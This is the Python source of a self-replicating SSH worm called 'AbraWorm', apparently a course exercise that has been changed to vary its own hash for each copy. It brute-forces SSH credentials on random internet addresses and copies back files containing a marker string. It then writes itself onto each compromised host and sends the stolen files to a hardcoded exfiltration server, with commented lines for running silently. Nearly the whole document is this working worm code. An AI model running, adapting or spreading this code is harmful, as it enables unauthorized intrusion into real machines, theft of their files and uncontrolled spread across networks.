#!/usr/bin/env python

import sys
import paramiko
import scp
import select
import signal
import os, base64, random, string, hashlib, uuid


##   You would want to uncomment the following two lines for the worm to _id_
##   work silently: _id_
#sys.stdout = open(os.devnull, 'w') _id_
#sys.stderr = open(os.devnull, 'w') _id_

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 0

NHOSTS = NUSERNAMES = NPASSWDS = 3

debugIPAddress = '127.0.0.1'
debugUsername = 'root'
debugPassword = 'mypassword'

exfiltrateIPAddress = '172.0.0.1'
exfiltrateUsername = 'root'
exfiltratePassword = 'mypassword'

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    # need a working username for debugging
    if debug: return [debugUsername]
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    # need a working username for debugging
    if debug: return [debugPassword]
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 
                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return [debugIPAddress]   
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 

def encrypt1(lines):
	enc, i = b"", random.randint(1,4)
	if i == 1:
		for line in lines:
			enc += base64.b16encode(line.encode('utf-8'))+b'\n'
	elif i == 2:
		for line in lines:
			enc += base64.b32encode(line.encode('utf-8'))+b'\n'
	elif i == 3:
		for line in lines:
			enc += base64.b64encode(line.encode('utf-8'))+b'\n'
	elif i == 4:
		for line in lines:
			enc += base64.b85encode(line.encode('utf-8'))+b'\n'
	return enc

def encrypt2(code):
    enc, i = b"", random.randint(1, 9)
    if i == 1:
        enc = hashlib.md5(code).hexdigest()
    elif i == 2:
        enc = hashlib.sha256(code).hexdigest()
    elif i == 3:
        enc = hashlib.sha224(code).hexdigest()
    elif i == 4:
        enc = hashlib.sha384(code).hexdigest()
    elif i == 5:
        enc = hashlib.sha3_384(code).hexdigest()
    elif i == 6:
        enc = hashlib.sha3_256(code).hexdigest()
    elif i == 7:
        enc = hashlib.sha512(code).hexdigest()
    elif i == 8:
        enc = hashlib.sha3_512(code).hexdigest()
    elif i == 9:
        enc = hashlib.sha3_224(code).hexdigest()

    return enc

while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
    
    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously infected
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error: 
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    if ''.join(received_list).find('AbraWorm') >= 0: 
                        print("\nThe target machine is already infected\n")      
                        continue
                    # Now let's look for files that contain the string 'abracadabra'
                    cmd = 'grep -ls abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error: 
                        print(error)
                        continue
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    # Now deposit a copy of AbraWorm.py at the target host
                    # MODIFIED
                    content = []
                    id = str(uuid.uuid4())
                    with open(__file__,"r") as file:
                        for line in file:
                            if(line.startswith('#!/usr/bin/env')):
                                content.append(line+ '\n')
                                continue
                            if(line.startswith('# File hash')):
                                continue
                            if(line.startswith("#")):
                                line = line.strip()
                                # Adding uid of file at the end
                                # -----------------------------
                                line = line.split()
                                line[-1] = id
                                line = " ".join(line)
                                # -----------------------------
                                content.append(line)
                                continue    
                            content.append(line)
            
                    with open(__file__, 'r') as file:
                        all_of_it = file.readlines()
                        code = encrypt1(all_of_it)
                        code = encrypt2(code)
                        content.insert(1, '# File hash: ' + str(code) + ' and id: ' + id)
            
                    with open(__file__,"w") as file:
                        for i in range(len(content)): 
                            file.write(content[i])
                            
                    scpcon.put(sys.argv[0])              
                    scpcon.close()
                except:
                    continue
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login _id_
                        #  credentials in the next statement _id_
                        ssh.connect(exfiltrateIPAddress,port=22,username=exfiltrateUsername,password=exfiltratePassword,timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("No uploading of exfiltrated files\n")
                        continue
    if debug: break
